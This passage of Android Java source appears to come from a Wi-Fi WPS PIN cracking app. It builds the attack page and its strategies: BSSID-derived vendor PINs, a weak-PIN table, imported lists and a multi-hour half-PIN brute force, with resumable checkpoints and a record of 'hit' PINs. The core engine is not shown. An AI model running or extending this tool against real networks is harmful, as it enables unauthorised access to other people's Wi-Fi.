        LinearLayout.LayoutParams startLp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 2f);
        startLp.rightMargin = px(10);
        mainActRow.addView(wpsStartBtn, startLp);

        wpsStopBtn = btnSecondary(L.s("停止", "Stop"));
        wpsStopBtn.setMinHeight(px(46));
        wpsStopBtn.setMinimumHeight(px(46));
        wpsStopBtn.setPadding(px(14), px(10), px(14), px(10));
        wpsStopBtn.setEnabled(false);
        wpsStopBtn.setOnClickListener(v -> stopWps());
        mainActRow.addView(wpsStopBtn, new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        opCard.addView(mainActRow);

        // 断点状态栏：内凹质感徽标栏（不再直接裸排两行散乱文本）
        LinearLayout resumeBox = new LinearLayout(this);
        resumeBox.setOrientation(LinearLayout.VERTICAL);
        resumeBox.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        resumeBox.setPadding(px(10), px(8), px(10), px(8));
        wpsResumeLine = new TextView(this);
        wpsResumeLine.setTextSize(FS_TINY);
        wpsResumeLine.setTextColor(AmberTheme.TEXT_DIM);
        wpsResumeLine.setLineSpacing(px(2), 1.05f);
        wpsResumeLine.setTypeface(android.graphics.Typeface.MONOSPACE);
        resumeBox.addView(wpsResumeLine);
        LinearLayout.LayoutParams rblp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rblp.topMargin = px(10);
        opCard.addView(resumeBox, rblp);

        // 次级入口：历史任务 / 命中证据 / 重置进度（紧凑单行，内边距收敛，杜绝双行折字）
        LinearLayout sub = new LinearLayout(this);
        sub.setOrientation(LinearLayout.HORIZONTAL);
        sub.setGravity(android.view.Gravity.CENTER_VERTICAL);

        wpsHistoryBtn = btnSecondary(L.s("历史任务", "History"));
        wpsHistoryBtn.setSingleLine(true);
        wpsHistoryBtn.setTextSize(FS_TINY);
        wpsHistoryBtn.setPadding(px(6), px(8), px(6), px(8));
        wpsHistoryBtn.setOnClickListener(v -> showWpsHistoryDialog());
        LinearLayout.LayoutParams hlp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        hlp.rightMargin = px(8);
        sub.addView(wpsHistoryBtn, hlp);

        wpsEvidenceBtn = btnSecondary(L.s("命中证据", "Evidence"));
        wpsEvidenceBtn.setSingleLine(true);
        wpsEvidenceBtn.setTextSize(FS_TINY);
        wpsEvidenceBtn.setPadding(px(6), px(8), px(6), px(8));
        wpsEvidenceBtn.setOnClickListener(v -> showWpsEvidenceDialog());
        LinearLayout.LayoutParams elp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        elp.rightMargin = px(8);
        sub.addView(wpsEvidenceBtn, elp);

        Button resetBtn = btnSecondary(L.s("重置进度", "Reset"));
        resetBtn.setSingleLine(true);
        resetBtn.setTextSize(FS_TINY);
        resetBtn.setPadding(px(6), px(8), px(6), px(8));
        resetBtn.setOnClickListener(v -> confirmResetWps());
        sub.addView(resetBtn, new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        LinearLayout.LayoutParams subLp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        subLp.topMargin = px(10);
        opCard.addView(sub, subLp);
        refreshWpsButtons();
        pageWps.addView(opCard, sectionGap());

        // ============ F. 执行与进度卡（清晰的结论头 + 等宽事实度量） ============
        pageWps.addView(sectionLabel(L.s("任务与结果", "Task & result")));
        LinearLayout progCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        progCard.setPadding(px(14), px(12), px(14), px(12));

        wpsStatusLine = new TextView(this);
        wpsStatusLine.setTextSize(AmberTheme.FS_BODY);
        wpsStatusLine.setTextColor(TEXT);
        wpsStatusLine.setTypeface(android.graphics.Typeface.create("sans-serif-medium",
                android.graphics.Typeface.NORMAL));
        wpsStatusLine.setLineSpacing(px(3), 1f);
        progCard.addView(wpsStatusLine);

        // 进度与度量数据排版
        wpsProgressLine = new TextView(this);
        wpsProgressLine.setTextSize(FS_TINY);
        wpsProgressLine.setTextColor(AmberTheme.TEXT_DIM);
        wpsProgressLine.setTypeface(android.graphics.Typeface.MONOSPACE);
        wpsProgressLine.setLineSpacing(px(3), 1f);
        wpsProgressLine.setPadding(px(2), px(6), px(2), px(2));
        progCard.addView(wpsProgressLine);
        pageWps.addView(progCard, sectionGap());

        // ============ G. 运行记录（嵌入式 Linux 终端控制台，消除测量膨胀与空白） ============
        pageWps.addView(sectionLabel(L.s("运行记录", "Run log")));
        LinearLayout logCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        logCard.setPadding(px(12), px(10), px(12), px(10));

        // 终端顶栏：单行控制台标签 + 右侧小巧清空按钮
        LinearLayout termHeader = new LinearLayout(this);
        termHeader.setOrientation(LinearLayout.HORIZONTAL);
        termHeader.setGravity(android.view.Gravity.CENTER_VERTICAL);

        TextView termTag = new TextView(this);
        termTag.setText(L.s("● wpa_supplicant 终端控制台", "● wpa_supplicant terminal"));
        termTag.setTextSize(FS_TINY);
        termTag.setTextColor(ACCENT);
        termTag.setSingleLine(true);
        termTag.setTypeface(android.graphics.Typeface.MONOSPACE);
        LinearLayout.LayoutParams tagLp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        tagLp.rightMargin = px(8);
        termHeader.addView(termTag, tagLp);

        Button clearLogBtn = new Button(this);
        clearLogBtn.setText(L.s("清空", "Clear"));
        clearLogBtn.setTextSize(FS_TINY);
        clearLogBtn.setTextColor(TEXT);
        clearLogBtn.setAllCaps(false);
        clearLogBtn.setSingleLine(true);
        clearLogBtn.setMinHeight(0);
        clearLogBtn.setMinimumHeight(0);
        clearLogBtn.setStateListAnimator(null);
        clearLogBtn.setPadding(px(12), px(4), px(12), px(4));
        clearLogBtn.setBackground(roundBgStroked(BTN_2ND_BG, BTN_2ND_EDGE, AmberTheme.RADIUS_CHIP, 0.8f));
        clearLogBtn.setOnClickListener(v -> {
            wpsLogMgr.clear();
            if (wpsLogView != null) {
                wpsLogView.setText(L.s("[*] 控制台日志已清空\n", "[*] Console log cleared\n"));
            }
        });
        termHeader.addView(clearLogBtn, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        logCard.addView(termHeader);

        // 嵌入式终端滚动窗（固定高度 220dp，黑色底色，手势拦截）
        wpsLogScroll = new android.widget.ScrollView(this);
        wpsLogScroll.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CARD));
        wpsLogScroll.setPadding(px(10), px(8), px(10), px(8));
        wpsLogScroll.setFillViewport(true);
        wpsLogScroll.setVerticalScrollBarEnabled(true);
        wpsLogScroll.setScrollBarStyle(android.view.View.SCROLLBARS_INSIDE_INSET);
        wpsLogScroll.setOnTouchListener((v, e) -> {
            if (e.getAction() == android.view.MotionEvent.ACTION_DOWN) {
                v.getParent().requestDisallowInterceptTouchEvent(true);
            } else if (e.getAction() == android.view.MotionEvent.ACTION_UP
                    || e.getAction() == android.view.MotionEvent.ACTION_CANCEL) {
                v.getParent().requestDisallowInterceptTouchEvent(false);
            }
            return false;
        });

        wpsLogView = new TextView(this);
        wpsLogView.setTextSize(FS_TINY);
        wpsLogView.setTextColor(AmberTheme.OK); // 终端复古绿
        wpsLogView.setTypeface(android.graphics.Typeface.MONOSPACE);
        wpsLogView.setLineSpacing(px(3), 1f);
        wpsLogView.setTextIsSelectable(true);
        wpsLogView.setText(!wpsLogMgr.isEmpty() ? wpsLogMgr.snapshot()
                : L.s("[*] WPS 控制台已就绪\n[*] 等待任务指令...\n",
                      "[*] WPS console ready\n[*] Waiting for task commands...\n"));
        wpsLogScroll.addView(wpsLogView);

        LinearLayout.LayoutParams scrollLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(220));
        scrollLp.topMargin = px(6);
        logCard.addView(wpsLogScroll, scrollLp);
        pageWps.addView(logCard, sectionGap());

        refreshWpsProgress();
        // 2026-11-08：首次进入 WPS 页自动扫描一次 —— 页面本来就是空列表，
        // 让用户手动点「扫描 AP」再等 14s 不符合直觉；进页就直接发现附近网络，
        // 扫描中会如实显示「扫描中」，完成后自动列出并选中首个 AP。
        doWpsScan();
    }
    // 2026-11-08：完整枚举已从生产移除（10^7 不可行 + 内存打满）。旧 mode=4 回退拆半。
    private static final String[] WPS_MODE_ZH = {
            "厂商算法（BSSID 派生）", "内置弱 PIN 表", "我的列表（导入）",
            "拆半攻击（先前 4 位、再后 3 位）"};
    private static final String[] WPS_MODE_EN = {
            "Vendor algorithms", "Built-in weak PINs", "My list (imported)",
            "Half-PIN attack (prefix then suffix)"};

    /** 拆半：阶段 1 的断点（跨阶段切换保留） */
    private int wpsHalfCursor1 = 0;
    /** 拆半断点绑定的目标，防止换目标后接着别人的进度跑 */
    private String wpsHalfBssid = "";

    /**
     * 拆半要跑几十小时，必须能跨 App 重启续跑。
     *
     * <p>断点存成 **schema 化的单条记录**（io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint）：
     * 目标 BSSID + SSID + 策略 + 阶段 + 游标 + 前缀一起存。
     * 旧版只存 BSSID 与游标 —— 换目标后照样显示「继续」、点下去却从头跑，
     * 而且没有版本号、没有备份（第二阶段审计 P0-4）。
     */
    private void saveHalfState() {
        try {
            io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint cp = new io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint();
            cp.taskId = wpsTaskId;
            cp.bssid = wpsHalfBssid;
            cp.ssid = wpsHalfSsid;
            cp.mode = wpsMode;
            cp.phase = wpsSession.halfPhase;
            cp.cursor = wpsSession.halfCursor;
            cp.cursor1 = wpsHalfCursor1;
            cp.prefix = wpsSession.halfPrefix;
            cp.updatedAtMs = System.currentTimeMillis();
            if (!wpsTaskMgr().saveCheckpoint(cp)) {
                wpsLog(L.s("[!] 断点写入失败 —— 本批进度没落盘（下次会从更早的位置重跑）",
                        "[!] checkpoint write failed - progress not saved"));
            }
        } catch (Throwable t) {
            wpsLog("[err] 断点写入: " + t);
        }
    }

    /**
     * 把断点装回内存。
     *
     * @return 空串 = 成功；否则是**给用户看的原因**（不再静默从头开始）
     */
    private String loadHalfState() {
        io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint.Parse p = wpsTaskMgr().loadFor(
                wpsHalfBssid, wpsHalfSsid, wpsMode);
        if (!p.ok()) return p.error == null ? "断点不可用" : p.error;
        io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint cp = p.cp;
        wpsSession.halfPhase = cp.phase;
        wpsSession.halfCursor = cp.cursor;
        wpsHalfCursor1 = cp.cursor1;
        wpsSession.halfPrefix = cp.prefix;
        if (cp.taskId != null && !cp.taskId.isEmpty()) wpsTaskId = cp.taskId;
        if (p.note != null && !p.note.isEmpty()) wpsLog("[i] " + p.note);
        return "";
    }

    // ---------------- 第二阶段：台账 ----------------

    /** 开一个新任务并落台账（新任务不覆盖旧任务）。 */
    private void wpsTaskStart(String bssid, String ssid, int mode) {
        long now = System.currentTimeMillis();
        wpsTaskId = io.github.wlmosv_png.wpaforge.wps.WpsLedger.newTaskId(bssid, now);
        wpsTask = io.github.wlmosv_png.wpaforge.wps.WpsLedger.start(wpsTaskId, bssid, ssid, mode, now);
        boolean zh = L.s("a", "b").equals("a");
        // 结构化：任务创建 —— 任务 ID / 目标身份 / 策略
        wpsLog(L.s("[任务] 创建 " + wpsTaskId, "[task] created " + wpsTaskId));
        wpsLog(L.s("[目标] SSID=" + (ssid == null || ssid.isEmpty() ? "(未知)" : ssid)
                        + "  BSSID=" + bssid,
                "[target] SSID=" + (ssid == null || ssid.isEmpty() ? "(unknown)" : ssid)
                        + "  BSSID=" + bssid));
        wpsLog(L.s("[策略] " + wpsModeLabel(mode), "[strategy] " + wpsModeLabel(mode)));
        // 绑定到任务管理器（断点归属校验用；换目标后不会串进度）
        wpsTaskMgr().bind(wpsTaskId, bssid, ssid, mode, now);
        if (!wpsLedger().upsert(wpsTask)) {
            wpsLog(L.s("[!] 台账写入失败（历史记录可能不完整）", "[!] ledger write failed"));
        }
    }

    /** 把当前进度/最近一条结果同步进台账。 */
    private void wpsTaskSync(String lastPin, String lastResult) {
        if (wpsTask == null) return;
        try {
            wpsTask.updatedAtMs = System.currentTimeMillis();
            wpsTask.phase = wpsSession == null ? wpsTask.phase : wpsSession.halfPhase;
            wpsTask.doneCount = wpsSession == null ? wpsTask.doneCount : wpsSession.halfCursor;
            if (lastPin != null && !lastPin.isEmpty()) wpsTask.lastPin = lastPin;
            if (lastResult != null && !lastResult.isEmpty()) wpsTask.lastResult = lastResult;
            wpsLedger().upsert(wpsTask);
        } catch (Throwable t) {
            wpsLog("[err] 台账更新: " + t);
        }
    }

    /** 结束当前任务（写状态与终止原因）；命中证据一并落账。 */
    private void wpsTaskFinish(String status, String reason) {
        if (wpsTask == null) return;
        try {
            wpsTask.status = status;
            wpsTask.endReason = reason == null ? "" : reason;
            wpsTask.endedAtMs = System.currentTimeMillis();
            wpsTask.updatedAtMs = wpsTask.endedAtMs;
            if (wpsSession != null) {
                wpsTask.phase = wpsSession.halfPhase;
                wpsTask.doneCount = wpsSession.halfCursor;
                if (wpsSession.hitPin != null && !wpsSession.hitPin.isEmpty()) {
                    wpsTask.hitPin = wpsSession.hitPin;
                    wpsTask.hitVerdict = wpsSession.hitVerdict;
                    wpsTask.evidence = io.github.wlmosv_png.wpaforge.wps.WpsEngine.evidenceSummary(wpsSession);
                    wpsTask.hitOnline = wpsSession.hitOnline;
                    wpsTask.connVerify = wpsSession.hitOnline
                            ? "ONLINE" : L.s("已连上但当时没拿到 IP", "connected, no IP yet");
                }
                // 纠错结果落账（P0-3）：原始判定/PIN 与修正判定同时保留；
                // 应用重启后从台账读回，不会退回「命中」。
                if (wpsSession.hitCorrected) {
                    wpsTask.corrected = true;
                    wpsTask.originalVerdict = wpsSession.hitOriginalVerdict;
                    wpsTask.originalPin = wpsSession.hitOriginalPin;
                    wpsTask.correctedVerdict = wpsSession.hitCorrectedVerdict;
                    wpsTask.correctionReason = wpsSession.hitCorrectionReason;
                    wpsTask.correctedAtMs = wpsSession.hitCorrectedAtMs;
                    // 纠错后当前有效判定是 NOT_TARGET → 不保留为"命中"
                    wpsTask.hitPin = "";
                    wpsTask.hitVerdict = wpsSession.hitVerdict;
                    wpsTask.evidence = io.github.wlmosv_png.wpaforge.wps.WpsEngine.correctionSummary(wpsSession);
                }
            }
            wpsLedger().upsert(wpsTask);
        } catch (Throwable t) {
            wpsLog("[err] 台账收尾: " + t);
        }
    }

    private LinearLayout wpsImportRow;
    private static final int REQ_WPS_IMPORT = 0x7A51;
    /** 「选择材料文件」的 SAF 请求码（离线校验用）。 */
    private static final int REQ_OFFLINE_PICK = 0x7A62;

    private void refreshWpsImportLine() {
        if (wpsImportLine == null) return;
        int n = io.github.wlmosv_png.wpaforge.wps.WpsDataManager.count(getFilesDir());
        wpsImportLine.setText(L.s("我的列表：", "My list: ") + n
                + L.s(" 条（策略切到「我的列表」时使用）",
                      " entries (used by the 'My list' strategy)"));
    }

    /**
     * 粘贴导入：先解析并**预览结果**（有效 / 无效 / 重复 / 每种无效原因），
     * 用户确认后才真正保存。修复前是静默保存 —— 8 位非法校验位被悄悄改写、
     * 长数字串被悄悄丢尾，用户无从知道导入结果对不对。
     */
    private void showWpsPasteDialog() {
        final EditText input = new EditText(this);
        input.setInputType(android.text.InputType.TYPE_CLASS_TEXT
                | android.text.InputType.TYPE_TEXT_FLAG_MULTI_LINE);
        input.setMinLines(6);
        input.setHint(L.s("每行一个 PIN（7 位或 8 位）。8 位但不合法会原样保留并提示，不会悄悄改。",
                "One PIN per line (7 or 8 digits). Invalid 8-digit values are kept as-is with a note."));
        final TextView prev = new TextView(this);
        prev.setTextSize(AmberTheme.FS_SMALL);
        prev.setTextColor(AmberTheme.TEXT_DIM);
        prev.setPadding(px(4), px(6), px(4), px(4));
        prev.setText(L.s("（输入后点下方「预览」查看解析结果；「保存」把有效候选追加保存）",
                "(press Preview below; Save appends valid candidates)"));
        // 预览按钮嵌在 view 内 —— AlertDialog 的按钮一碰就关框，
        // 预览要看解析明细，必须在框里完成。
        final Button prevBtn = btnSecondary(L.s("预览解析结果", "Preview"));
        prevBtn.setEnabled(false);
        android.text.TextWatcher tw = new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int a, int b, int c) { }
            public void onTextChanged(CharSequence s, int a, int b, int c) { }
            public void afterTextChanged(android.text.Editable e) {
                boolean has = e != null && e.length() > 0;
                prevBtn.setEnabled(has);
                if (!has) prev.setText(L.s("（无输入）", "(empty)"));
            }
        };
        input.addTextChangedListener(tw);
        prevBtn.setOnClickListener(v -> {
            String text = input.getText() == null ? "" : input.getText().toString();
            io.github.wlmosv_png.wpaforge.wps.WpsCandidates.Report rep =
                    io.github.wlmosv_png.wpaforge.wps.WpsDataManager.parse(text);
            io.github.wlmosv_png.wpaforge.wps.WpsDataManager.ImportSummary isum =
                    io.github.wlmosv_png.wpaforge.wps.WpsDataManager
                            .summarize(rep, L.s("a", "b").equals("a"));
            StringBuilder sb = new StringBuilder();
            sb.append(L.s("原始输入：", "Raw: ")).append(text.length())
                    .append(L.s(" 字符  有效候选：", " chars | valid: "))
                    .append(rep.accepted.size())
                    .append(L.s("  无效：", " | invalid: ")).append(rep.invalidCount)
                    .append(L.s("  重复：", " | dup: "))
                    .append(Math.max(0, rep.accepted.size() - new java.util.LinkedHashSet<>(
                            rep.accepted).size())).append("\n");
            if (rep.truncated) sb.append(L.s("（输入超限已截断）\n", "(input truncated)\n"));
            if (!rep.issues.isEmpty()) {
                sb.append(L.s("\n错误明细（位置 / 原因）：\n", "\nIssues (pos / reason):\n"));
                int shown = Math.min(rep.issues.size(), 8);
                for (int i = 0; i < shown; i++) {
                    io.github.wlmosv_png.wpaforge.wps.WpsCandidates.Issue it = rep.issues.get(i);
                    sb.append("  #").append(it.pos).append(' ').append(it.reason).append("\n");
                }
                if (rep.issues.size() > shown) sb.append(L.s(
                        "  …还有 " + (rep.issues.size() - shown) + " 条\n",
                        "  …and " + (rep.issues.size() - shown) + " more\n"));
            } else {
                sb.append(L.s("\n无错误：全部可导入。", "\nNo errors: all importable."));
            }
            prev.setText(sb.toString());
        });
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.addView(input);
        box.addView(prevBtn, topGap(6));
        box.addView(prev);
        io.github.wlmosv_png.wpaforge.ui.NetDialog pasteDlg = new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                L.s("粘贴 PIN 列表（解析后确认）", "Paste PIN list (preview first)"), null);
        pasteDlg.addView(box);
        pasteDlg.setPositive(L.s("保存", "Save"), nd ->
                wpsImportCommit(input.getText() == null ? "" : input.getText().toString(), true));
        pasteDlg.setNegative(L.s("取消", "Cancel"), null);
        pasteDlg.show();
    }

    /** 预览确认后真正写入。 */
    private void wpsImportCommit(String text, boolean append) {
        int n = io.github.wlmosv_png.wpaforge.wps.WpsDataManager
                .save(getFilesDir(), text == null ? "" : text, append);
        refreshWpsImportLine();
        Toast.makeText(this, L.s("已保存，共 " + n + " 条",
                "Saved, " + n + " total"), Toast.LENGTH_SHORT).show();
    }

    private void pickWpsFile() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.content.Intent.ACTION_OPEN_DOCUMENT);
            i.addCategory(android.content.Intent.CATEGORY_OPENABLE);
            i.setType("*/*");
            startActivityForResult(i, REQ_WPS_IMPORT);
        } catch (Throwable t) {
            Toast.makeText(this, "无法打开文件选择器: " + t.getMessage(),
                    Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // 离线校验的材料导入走独立通道，必须先分流 ——
        // 否则会被下面 WPS 的守卫直接 return 掉，表现为「点了没反应」。
        if (requestCode == REQ_OFFLINE_PICK) {
            handleOfflinePick(resultCode, data);
            return;
        }
        if (requestCode != REQ_WPS_IMPORT || resultCode != RESULT_OK || data == null) return;
        final android.net.Uri uri = data.getData();
        if (uri == null) return;
        new Thread(() -> {
            String text = null;
            java.io.InputStream in = null;
            try {
                in = getContentResolver().openInputStream(uri);
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
                text = new String(bos.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
            } catch (Throwable t) {
                final String msg = String.valueOf(t);
                runOnUiThread(() -> Toast.makeText(this, "读取失败: " + msg,
                        Toast.LENGTH_LONG).show());
                return;
            } finally {
                if (in != null) try {
                    in.close();
                } catch (Throwable ignored) {
                }
            }
            final String ft = text;
            runOnUiThread(() -> {
                int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                        .saveCustom(getFilesDir(), ft, true);
                refreshWpsImportLine();
                Toast.makeText(this, L.s("已导入，共 " + n + " 条",
                        "Imported, " + n + " total"), Toast.LENGTH_LONG).show();
            });
        }, "wps-import").start();
    }

    private String wpsStrategyName() {
        return L.s(WPS_MODE_ZH[wpsMode], WPS_MODE_EN[wpsMode]);
    }

    private void refreshWpsStrategy() {
        renderWpsModeList();
    }

    /** 策略列表：一行一档，点哪档用哪档（原来是单按钮循环切，容易点错也不知道共几档）。 */
    private void renderWpsModeList() {
        if (wpsModeList == null) return;
        wpsModeList.removeAllViews();
        final boolean zh = L.s("a", "b").equals("a");
        for (int i = 0; i < WPS_MODE_ZH.length; i++) {
            final int mode = i;
            final boolean on = (wpsMode == i);
            // 紧凑单选行：第一行 = 单选标记 + 策略名 + 状态；第二行 = 一句说明。
            // 整个策略区由多个 64–84dp 的行组成，不再是大框套小框。
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.VERTICAL);
            row.setBackground(roundBgStroked(on ? AmberTheme.ACCENT_BG : SURFACE,
                    on ? ACCENT : BTN_2ND_EDGE, 16, 0.8f));
            row.setPadding(px(14), px(10), px(14), px(10));
            LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            rlp.bottomMargin = px(6);
            row.setLayoutParams(rlp);
            row.setClickable(true);

            // 第一行：单选标记 + 名称 + 状态胶囊（右）
            LinearLayout t1 = new LinearLayout(this);
            t1.setOrientation(LinearLayout.HORIZONTAL);
            t1.setGravity(android.view.Gravity.CENTER_VERTICAL);
            TextView dot = new TextView(this);
            dot.setText(on ? "● " : "○ ");
            dot.setTextSize(AmberTheme.FS_BODY);
            dot.setTextColor(on ? ACCENT : AmberTheme.TEXT_DIM);
            t1.addView(dot);
            TextView name = new TextView(this);
            name.setText(L.s(WPS_MODE_ZH[i], WPS_MODE_EN[i]));
            name.setTextSize(AmberTheme.FS_BODY);
            name.setTextColor(on ? ACCENT : TEXT);
            name.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
            name.setSingleLine(true);
            name.setEllipsize(TextUtils.TruncateAt.END);
            t1.addView(name, new LinearLayout.LayoutParams(0,
                    ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
            TextView state = new TextView(this);
            state.setText(modeStateLabel(zh, mode));
            state.setTextSize(FS_TINY);
            state.setTextColor(on ? AmberTheme.ON_ACCENT : AmberTheme.TEXT_DIM);
            state.setBackground(roundBg(on ? ACCENT : AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
            state.setPadding(px(8), px(2), px(8), px(2));
            t1.addView(state);
            row.addView(t1);

            // 第二行：一句说明
            TextView dsc = new TextView(this);
            dsc.setText(L.s(WPS_MODE_DESC_ZH[i], WPS_MODE_DESC_EN[i]));
            dsc.setTextSize(FS_TINY);
            dsc.setTextColor(on ? AmberTheme.TEXT_DIM : AmberTheme.TEXT_DIM);
            dsc.setPadding(px(2), px(4), px(2), 0);
            LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            dlp.topMargin = px(3);
            row.addView(dsc, dlp);

            // 点击行为：切策略 + 更新导入区显隐
            row.setOnClickListener(v -> {
                if (wpsTaskMgr().isRunning()) return;
                wpsMode = mode;
                renderWpsModeList();
            });
            wpsModeList.addView(row);
        }
        // 导入入口只在「我的列表」(mode==2) 选中时展示
        boolean myList = (wpsMode == 2);
        if (wpsImportRow != null) wpsImportRow.setVisibility(myList ? View.VISIBLE : View.GONE);
        if (wpsImportLine != null) wpsImportLine.setVisibility(myList ? View.VISIBLE : View.GONE);
    }

    /** 策略行的状态胶囊（数据量 / 实际来源）。 */
    private String modeStateLabel(boolean zh, int mode) {
        if (mode == 0) {
            return zh ? "可派生" : "derivable";
        }
        if (mode == 1) {
            int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates.builtinWeak().size();
            return zh ? n + " 项" : n + " items";
        }
        if (mode == 2) {
            int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                    .loadCustom(getFilesDir()).size();
            return zh ? n + " 条" : n + " rows";
        }
        return zh ? "高风险" : "high-risk";
    }

    /** 每档策略的说明（跟着标题一起显示在按钮里）。 */
    private static final String[] WPS_MODE_DESC_ZH = {
            "按 BSSID 算出有来源的厂商默认 PIN（D-Link / ASUS / Airocon）；固定出厂值另列。",
            "内置弱 PIN 表：65 个出厂默认 / 常见值，可离线直接试。",
            "你自己导入的候选（下方可粘贴或从文件导入；8 位不合法会原样保留并提示）。",
            "依次穷举前 4 位（1 万次）与后 3 位（1 千次），覆盖合法 8 位 PIN 的取值空间。" +
            "耗时以十小时计，且可能触发 AP 锁定——不保证成功。"};
    private static final String[] WPS_MODE_DESC_EN = {
            "Derive sourced factory PINs from the BSSID (D-Link / ASUS / Airocon); fixed values listed separately.",
            "Built-in weak PIN table: 65 factory / common values.",
            "Your own imported candidates (8-digit invalid kept as-is with a note).",
            "Try first 4 digits (10k) then last 3 (1k); spans the valid 8-digit space. " +
            "Hours-long and may trip AP lock-out - no success guarantee."};

    /** 当前策略下要试的候选（完整枚举走另一条路）。 */
    private java.util.List<String> wpsCandidatePins(String bssid) {
        // 2026-11-09 架构升级：候选生成统一走 WpsStrategyManager（登记 + 委托现有实现）
        return io.github.wlmosv_png.wpaforge.wps.WpsStrategyManager
                .candidates(wpsMode, bssid, getFilesDir());
    }

    private void wpsLog(String line) {
        // 2026-11-09 架构升级：日志格式/缓冲/裁剪统一由 WpsLogManager 负责
        //（时间戳、有界缓冲、并发安全都在那边，可离线单测）。
        wpsLogMgr.log(line);
        // WPS 页可能尚未构建（onResume 早于 buildWpsTab）→ wpsLogView 为空时只入缓冲
        if (wpsLogView != null) {
            runOnUiThread(() -> {
                wpsLogView.setText(wpsLogMgr.snapshot());
                if (wpsLogScroll != null) {
                    wpsLogScroll.post(() -> wpsLogScroll.fullScroll(android.view.View.FOCUS_DOWN));
                }
            });
        }
    }

    /** 扫描进度：转圈 + 一行阶段文字（不再干等三十秒后突然蹦出来）。 */
    private void wpsScanBusy(boolean on, String text) {
        if (wpsScanBar != null) wpsScanBar.setVisibility(on ? View.VISIBLE : View.GONE);
        if (wpsScanStatus == null) return;
        if (on && text != null && !text.isEmpty()) {
            wpsScanStatus.setText(text);
            wpsScanStatus.setVisibility(View.VISIBLE);
        } else if (!on) {
            wpsScanStatus.setVisibility(View.GONE);
        }
    }

    private void doWpsScan() {
        if (wpsTaskMgr().isRunning()) {
            Toast.makeText(this, L.s("任务运行中，请先暂停", "Task running - pause first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        wpsTargetMgr.targets().clear();
        wpsTargetMgr.clearSelection();
        wpsTargetMgr.beginScan();          // NEVER/DONE/FAILED → SCANNING
        wpsCapByBssid.clear();             // 重新扫描 → 能力缓存过期，清空
        renderWpsTargets();
        wpsCtrlOk = -1;
        wpsScanBusy(true, L.s("扫描中…", "Scanning…"));
        new Thread(() -> {
            loadVulnList();     // 名单：读盘一次 + 进程内缓存
            java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> list =
                    io.github.wlmosv_png.wpaforge.wps.WpsController.scan(this,
                            new io.github.wlmosv_png.wpaforge.wps.WpsController.Listener() {
                                @Override
                                public void onLine(String line) {
                                    if (line == null) return;
                                    if (line.startsWith("CTRL_OK=")) {
                                        wpsCtrlOk = "1".equals(line.substring(8).trim()) ? 1 : 0;
                                        return;
                                    }
                                    if (line.startsWith("AP=")) {
                                        final io.github.wlmosv_png.wpaforge.wps.WpsController.Target t =
                                                io.github.wlmosv_png.wpaforge.wps.WpsController.parseApLine(line);
                                        if (t != null) {
                                            // 设备名读不到就不判：宁可不标，不编
                                            t.vuln = io.github.wlmosv_png.wpaforge.wps.VulnWsc
                                                    .match(t.wpsDevice, vulnEntries);
                                            runOnUiThread(() -> {
                                                wpsTargetMgr.targets().add(t);
                                                renderWpsTargets();
                                            });
                                        }
                                    } else if (line.startsWith("PHASE=")) {
                                        final String p = line.substring(6).trim();
                                        runOnUiThread(() -> {
                                            if (p.startsWith("scan")) {
                                                wpsScanBusy(true, L.s("扫描第 " + p.substring(4).replace('_', '/')
                                                        + " 轮…", "scan round " + p.substring(4)));
                                            } else if ("enum".equals(p)) {
                                                wpsScanBusy(true, L.s("枚举 supplicant BSS 表…",
                                                        "enumerating BSS table…"));
                                            } else if ("caps".equals(p)) {
